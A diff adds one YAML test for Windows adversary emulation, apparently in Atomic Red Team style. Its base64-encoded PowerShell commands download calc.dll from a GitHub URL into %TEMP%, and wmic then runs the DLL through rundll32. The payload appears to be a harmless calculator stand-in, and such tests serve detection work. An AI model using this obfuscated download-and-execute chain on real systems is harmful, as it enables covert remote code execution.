@@ -1,0 +1,18 @@
+- id: 0dd21e76-5cdc-5992-94d2-3e89f374eb2b
+  name: Soumaia ART Tests - WMI Execute rundll32
+  description: This test uses wmic.exe to execute a DLL function using rundll32. Specify a valid value for remote IP using the node parameter.
+  tactic: execution
+  technique:
+    attack_id: T1047
+    name: Windows Management Instrumentation
+  platforms:
+    windows:
+      cmd:
+        command: |-
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABjAGEAbABjAC4AZABsAGwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
+          if not "%ERRORLEVEL%"=="0" (
+              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AYgBsAG8AYgAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAwADQANwAvAGIAaQBuAC8AYwBhAGwAYwAuAGQAbABsAD8AcgBhAHcAPQB0AHIAdQBlACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAYwBhAGwAYwAuAGQAbABsACIACgA=
+          )
+          wmic /node:127.0.0.1 process call create "rundll32.exe \"%TEMP%\ART-ExternalPayloads\calc.dll\" StartW"
+        cleanup: |-
+          taskkill /f /im calculator.exe
